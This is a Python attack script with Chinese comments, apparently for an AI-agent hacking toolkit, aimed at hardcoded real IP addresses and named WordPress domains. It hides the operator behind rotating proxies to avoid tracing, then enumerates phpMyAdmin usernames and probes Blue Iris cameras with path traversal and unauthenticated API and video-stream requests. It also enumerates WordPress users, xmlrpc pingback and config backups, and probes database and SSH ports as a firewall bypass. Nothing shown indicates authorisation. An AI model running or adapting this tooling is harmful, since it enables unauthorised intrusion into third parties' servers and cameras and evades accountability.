"""
精英猎人实战脚本 — 代替 LLM Agent 对真实资产做深度测试.

不是"扫完就报", 是一个目标一个目标地: 观察→定向→假设→行动→更新.

⚠️ OpSec: 所有流量强制走代理 (ProxyManager/MiniClash).
   绝不直连目标 — 这是红队第一原则.
   直连 = 暴露真实 IP + 触发告警 + 被反向溯源.
"""
import warnings, urllib3, requests, re, json, sys, os, time
warnings.filterwarnings('ignore'); urllib3.disable_warnings()

# ============================================================
# OpSec: 强制走代理 (绝不裸奔)
# ============================================================

class ProxyGuard:
    """
    代理守卫 — 确保所有请求走代理.

    用法:
        guard = ProxyGuard()        # 启动 mihomo
        S = guard.session           # 拿到配好代理的 Session
        ... 用 S 做请求 ...
        guard.rotate()              # 手动轮换节点
        guard.close()               # 关闭
    """

    def __init__(self, config_path='aiburp/proxy/yaml/dola_capable.yaml',
                 prefer_type='Vless', auto_rotate=False):
        from aiburp.proxy_manager import ProxyManager
        self.pm = ProxyManager()
        self.config_path = config_path
        self.prefer_type = prefer_type
        self.auto_rotate = auto_rotate
        self._ctrl_port = None
        self._node_idx = 0
        self._nodes = []

        print('[OpSec] 启动代理 (绝不直连)...')
        self.url = self.pm.start_clash(config_path=config_path)
        time.sleep(3)
        # 解析端口
        m = re.search(r':(\d+)', self.url)
        self._mixed_port = int(m.group(1)) if m else 0
        self._ctrl_port = self._mixed_port + 1

        # 收集候选节点
        self._collect_nodes()
        # 切到第一个偏好类型节点
        self._switch_to_preferred()

        # 构建 Session
        self.session = requests.Session()
        self.session.verify = False
        self.session.proxies = {'http': self.url, 'https': self.url}
        self.session.headers['User-Agent'] = (
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        )

        # 验证出口
        self._verify_exit()

    def _collect_nodes(self):
        """从 mihomo API 收集真实节点."""
        try:
            r = requests.get(f'http://127.0.0.1:{self._ctrl_port}/proxies', timeout=5)
            data = r.json()
            all_p = data.get('proxies', {})
            self._nodes = [n for n, p in all_p.items()
                          if p.get('type') in ('Vless', 'VMess', 'Trojan',
                                               'Shadowsocks', 'Http')]
            by_type = {}
            for n in self._nodes:
                t = all_p[n].get('type')
                by_type[t] = by_type.get(t, 0) + 1
            print(f'  节点池: {len(self._nodes)} 个 | 类型={by_type}')
        except Exception as e:
            print(f'  ⚠ 节点收集失败: {e}')
            self._nodes = []

    def _switch_to_preferred(self):
        """切换到偏好类型的节点."""
        if not self._nodes:
            return
        # 找偏好类型
        try:
            r = requests.get(f'http://127.0.0.1:{self._ctrl_port}/proxies', timeout=5)
            all_p = r.json().get('proxies', {})
            preferred = [n for n in self._nodes
                        if all_p.get(n, {}).get('type') == self.prefer_type]
            target = preferred[0] if preferred else self._nodes[0]
            requests.put(f'http://127.0.0.1:{self._ctrl_port}/proxies/GLOBAL',
                         json={'name': target}, timeout=5)
            print(f'  当前节点: {target[:40]}')
        except Exception:
            pass

    def rotate(self):
        """轮换到下一个节点."""
        if not self._nodes:
            return
        self._node_idx = (self._node_idx + 1) % len(self._nodes)
        target = self._nodes[self._node_idx]
        try:
            requests.put(f'http://127.0.0.1:{self._ctrl_port}/proxies/GLOBAL',
                         json={'name': target}, timeout=5)
            print(f'  [轮换] → {target[:40]}')
        except Exception:
            pass

    def _verify_exit(self):
        """验证代理出口 IP (不是真实 IP)."""
        try:
            r = self.session.get('http://httpbin.org/ip', timeout=20)
            exit_ip = r.json().get('origin', '?')
            print(f'  代理出口 IP: {exit_ip} ✓')
        except Exception as e:
            print(f'  ⚠ 代理验证失败: {type(e).__name__} — 可能节点不通')

    def close(self):
        try:
            self.pm.stop_clash()
            print('[OpSec] 代理已关闭')
        except Exception:
            pass


# 默认全局 Session — 延迟初始化 (只有真正跑测试时才启动代理)
_GUARD = None
S = None

def init_proxy():
    """初始化代理 (主流程必须先调用)."""
    global _GUARD, S
    if _GUARD is None:
        _GUARD = ProxyGuard()
        S = _GUARD.session
    return _GUARD

def banner(title):
    print('\n' + '='*64)
    print(title)
    print('='*64)

def observe_pma_login_diff(base, users):
    """维度 12: phpMyAdmin 登录响应差异 — 用户名枚举."""
    banner('[维度12] phpMyAdmin 登录响应差异分析 (用户枚举)')
    results = {}
    for u in users:
        try:
            r_get = S.get(f'{base}/', timeout=8)
            tok = re.search(r'name="token" value="([^"]+)"', r_get.text)
            tok = tok.group(1) if tok else ''
            sess = re.search(r'name="set_session" value="([^"]+)"', r_get.text)
            sess = sess.group(1) if sess else ''
            r = S.post(f'{base}/index.php', data={
                'pma_username': u, 'pma_password': 'WRONG_PW_xyz_99',
                'server': 1, 'lang': 'en', 'token': tok, 'set_session': sess,
            }, timeout=8, allow_redirects=False)
            clue = '标准' if 'Access denied' in r.text else \
                   ('Cannot log in' if 'Cannot log in' in r.text else '?')
            # 尝试提取泄露的用户名
            leak = re.findall(r"#2[0-9]+'[^']*'@'[^']*'", r.text)
            results[u] = {'status': r.status_code, 'len': len(r.text), 'clue': clue, 'leak': leak[:2]}
            print(f"  {u:22s} [{r.status_code}] {len(r.text):6d}b | {clue} | leak={leak[:1]}")
        except Exception as e:
            results[u] = {'err': str(e)[:50]}
            print(f"  {u:22s} ERR {type(e).__name__}")
    return results

def observe_blueiris(base):
    """Blue Iris 安防系统 — 七层解剖 + CVE + 路径穿越."""
    banner('[Blue Iris] 流量七层解剖')
    r = S.get(f'{base}/', timeout=10)
    print(f'状态: {r.status_code} | {len(r.text)}b')
    print(f'Server: {r.headers.get("Server","?")}')
    print('响应头:')
    for k, v in r.headers.items():
        print(f'  {k}: {v[:70]}')
    body = r.text
    ver = re.findall(r'(?i)blue[\s_-]*(?:server|iris)?\s*([0-9]+\.[0-9]+\.[0-9]+)',
                     body + r.headers.get('Server', ''))
    print(f'\n版本: {ver[:3]}')
    forms = re.findall(r'<form[^>]*action="([^"]+)"', body)
    print(f'表单 action: {forms[:5]}')
    inputs = re.findall(r'<input[^>]*name="([^"]+)"', body)
    print(f'表单字段: {inputs[:10]}')
    # JS API 端点
    apis = re.findall(r'["\']/(api[^"\'\s]+)["\']', body)
    print(f'JS API 端点: {list(set(apis))[:8]}')
    return r

def probe_blueiris_paths(base):
    """Blue Iris 已知敏感路径 + 路径穿越 (配置文件含明文凭据)."""
    banner('[Blue Iris] 配置/路径穿越/未授权 API')
    paths = [
        'login.asp', 'logout.asp', 'admin/index.htm',
        'jpg/view.htm', 'view.htm', 'mjpg/video.mjpg',  # 未授权视频流
        'img/main.jpg', 'img/temp.jpg',
        'api/', 'api/login', 'api/admin',
        'config.ini', 'blueiris.cfg', 'settings.json',
        'wav/', 'clips/', 'log/', 'recording/',
        '../blueiris.cfg', '..%2f..%2fblueiris.cfg',  # 路径穿越
        'jpg/../../windows/win.ini',
    ]
    found = []
    for p in paths:
        try:
            r = S.get(f'{base}/{p}', timeout=5, allow_redirects=False)
            note = ''
            if r.status_code == 200 and len(r.text) > 20:
                note = f' ← {len(r.text)}b: {r.text[:50].replace(chr(10)," ").replace(chr(13),"")}'
                found.append((p, len(r.text)))
            elif r.status_code in (301, 302, 401, 403):
                note = f' → {r.headers.get("Location","")[:40]}'
            print(f'  [{r.status_code}] /{p}{note}')
        except Exception as e:
            print(f'  [ERR] /{p}: {type(e).__name__}')
    return found

def probe_blueiris_api(base):
    """Blue Iris JSON API — 即使没登录, 看能否调命令."""
    banner('[Blue Iris] JSON API 未授权探测')
    # Blue Iris API 格式: /?cmd=xxx 或 /api/
    cmds = [
        ('?cmd=Login', {'user': 'admin', 'password': ''}),
        ('?cmd=Status', {}),
        ('?cmd=ListCameras', {}),
        ('?cmd=GetLog', {}),
        ('?cmd=Schedule', {}),
        ('?cmd=CameraList', {}),
    ]
    for qs, payload in cmds:
        try:
            r = S.get(f'{base}/{qs}', params=payload, timeout=5)
            data = ''
            if r.headers.get('Content-Type', '').startswith('application/json'):
                data = f' ← JSON: {r.text[:80]}'
            elif len(r.text) < 200:
                data = f' ← {r.text[:80]}'
            print(f'  [{r.status_code}] {qs:20s} {len(r.text)}b{data}')
        except Exception as e:
            print(f'  [ERR] {qs}: {type(e).__name__}')

# ============================================================
# WordPress 站群 — 不靠密码, 靠插件/REST/逻辑
# ============================================================

def fingerprint_wordpress_all():
    """所有 WP 站指纹: 版本/插件/主题 (这是攻击面的源头)."""
    banner('[WordPress] 全站群指纹 (版本/插件/主题)')
    sites = ['ashleywestmark.com', 'myth-racing.com', 'dryharvest.com',
             'performancehobbies.com']
    inventory = {}
    for site in sites:
        base = f'https://{site}'
        try:
            r = S.get(f'{base}/', timeout=15)
            gen = re.search(r'<meta name="generator" content="WordPress ([0-9.]+)"', r.text)
            plugins = sorted(set(re.findall(r'/wp-content/plugins/([^/]+)/', r.text)))
            themes = sorted(set(re.findall(r'/wp-content/themes/([^/]+)/', r.text)))
            wp_ver = gen.group(1) if gen else '?'
            inventory[site] = {'ver': wp_ver, 'plugins': plugins, 'themes': themes,
                               'server': r.headers.get('Server', '?')}
            print(f'  {site}: WP {wp_ver} | Server={r.headers.get("Server","?")}')
            print(f'    插件: {plugins}')
            print(f'    主题: {themes}')
        except Exception as e:
            print(f'  {site}: ERR {type(e).__name__}')
            inventory[site] = {'err': str(e)[:50]}
    return inventory

def deep_enum_wordpress(site):
    """单个 WP 站深度枚举: 用户/REST/xmlrpc/作者页/配置."""
    banner(f'[WordPress] {site} 深度枚举')
    base = f'https://{site}'
    findings = []

    # 1. REST 用户枚举
    try:
        r = S.get(f'{base}/wp-json/wp/v2/users', timeout=12)
        if r.status_code == 200:
            for u in r.json():
                findings.append(('用户枚举', 'high',
                    f'{u.get("slug")} (id={u.get("id")})'))
                print(f'  [high] 用户: {u.get("slug")} id={u.get("id")}')
    except Exception:
        pass

    # 2. xmlrpc 系统方法
    try:
        r = S.post(f'{base}/xmlrpc.php',
                   data='<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>',
                   headers={'Content-Type': 'text/xml'}, timeout=12)
        methods = re.findall(r'<value><string>([^<]+)</string></value>', r.text)
        has_pingback = 'pingback.ping' in methods
        if has_pingback:
            findings.append(('pingback SSRF', 'high', 'pingback.ping 可用'))
            print(f'  [high] pingback.ping 可用 → SSRF 攻击面')
    except Exception:
        pass

    # 3. 作者页枚举
    for i in range(1, 4):
        try:
            r = S.get(f'{base}/?author={i}', timeout=8, allow_redirects=True)
            m = re.search(r'/author/([^/]+)/', r.url)
            if m:
                findings.append(('作者页枚举', 'medium', f'author={i}: {m.group(1)}'))
                print(f'  [med] author={i}: {m.group(1)}')
        except Exception:
            break

    # 4. 配置/备份探测
    for p in ['wp-config.php.bak', 'wp-config.php.old', 'wp-content/debug.log',
              'readme.html']:
        try:
            r = S.get(f'{base}/{p}', timeout=6, allow_redirects=True)
            if r.status_code == 200 and len(r.text) > 20 and 'DB_' in r.text:
                findings.append(('配置泄露', 'critical', f'{p} 泄露 DB 凭据!'))
                print(f'  [CRITICAL] {p} 泄露!')
        except Exception:
            pass

    return findings

def check_wp_plugin_cves():
    """针对已发现的插件名查 CVE (启发式, 非自动化利用)."""
    banner('[WordPress] 插件 CVE 关联分析')
    # 已发现的关键插件 + 已知风险
    known_risks = {
        'robo-gallery': '多个版本有 SQLi/上传绕过 CVE (检查版本)',
        'post-slider-and-carousel': '检查是否存在未授权 SSRF/存储XSS',
        'beaf-before-and-after-gallery': '检查版本 — 旧版有文件上传问题',
        'contact-form-7': '关注邮件头注入 / 邮件转发滥用',
        'elementor': '检查版本 — 旧版有权限提升/SSRF',
        'wp-image-zoooom': '低危, 检查 XSS',
        'google-site-kit': '关注 OAuth/SSRF 配置',
    }
    for plugin, risk in known_risks.items():
        print(f'  {plugin:35s} → {risk}')
    print('\n  ⚠ 下一步: 对每个插件测 /wp-content/plugins/<name>/readme.txt 提取版本')
    print('           然后用 nuclei -t cves/ -u <site> 或手动验证')

# ============================================================
# SYN-ACK 防火墙绕过
# ============================================================

def try_synack_bypass():
    """216.215.30.34 的 SYN-ACK 防火墙尝试绕过.

    ⚠️ OpSec: raw socket 必须走 SOCKS5 代理 (用 PySocks),
       否则暴露真实 IP. 绝不裸连.
    """
    banner('[防火墙] SYN-ACK 绕过尝试 (216.215.30.34) — 走 SOCKS5 代理')
    import socks  # PySocks
    import socket
    # 解析代理 URL
    # S.url 形如 socks5h://127.0.0.1:35717
    m = re.search(r':(\d+)', _GUARD.url)
    proxy_port = int(m.group(1)) if m else 7890

    targets = [
        ('216.215.30.34', 3306, 'mysql'),
        ('216.215.30.34', 6379, 'redis'),
        ('216.215.30.34', 22, 'ssh'),
    ]
    for host, port, svc in targets:
        sock = None
        try:
            # 通过 SOCKS5 代理建立 TCP 连接
            sock = socks.socksocket()
            sock.set_proxy(socks.SOCKS5, '127.0.0.1', proxy_port)
            sock.settimeout(10)
            sock.connect((host, port))
            sock.send(b'\n')
            try:
                data = sock.recv(1024)
                if data:
                    print(f'  {host}:{port} ({svc}): 有响应! {data[:40]}')
                else:
                    print(f'  {host}:{port} ({svc}): 空响应 — SYN-ACK 墙确认')
            except socket.timeout:
                print(f'  {host}:{port} ({svc}): 超时 — SYN-ACK 墙 (无服务)')
        except Exception as e:
            print(f'  {host}:{port} ({svc}): {type(e).__name__}')
        finally:
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass

if __name__ == '__main__':
    cmd = sys.argv[1] if len(sys.argv) > 1 else 'all'

    # OpSec: 必须先初始化代理, 否则拒绝运行
    if cmd in ('pma', 'bi', 'wp', 'firewall', 'all'):
        guard = init_proxy()
        try:
            if cmd in ('pma', 'all'):
                observe_pma_login_diff('https://216.215.30.37/phpmyadmin',
                                       ['root', 'admin', 'phpmyadmin', 'mysql', 'pma', 'nonexistent_xyz'])
            if cmd in ('bi', 'all'):
                B = 'http://173.209.174.233:81'
                observe_blueiris(B)
                probe_blueiris_paths(B)
                probe_blueiris_api(B)
            if cmd in ('wp', 'all'):
                fingerprint_wordpress_all()
                deep_enum_wordpress('ashleywestmark.com')
                check_wp_plugin_cves()
            if cmd in ('firewall', 'all'):
                try_synack_bypass()
        finally:
            guard.close()
    elif cmd == 'proxytest':
        # 只测代理
        guard = init_proxy()
        guard.close()
    else:
        print(f'用法: python huntaid.py [pma|bi|wp|firewall|all|proxytest]')
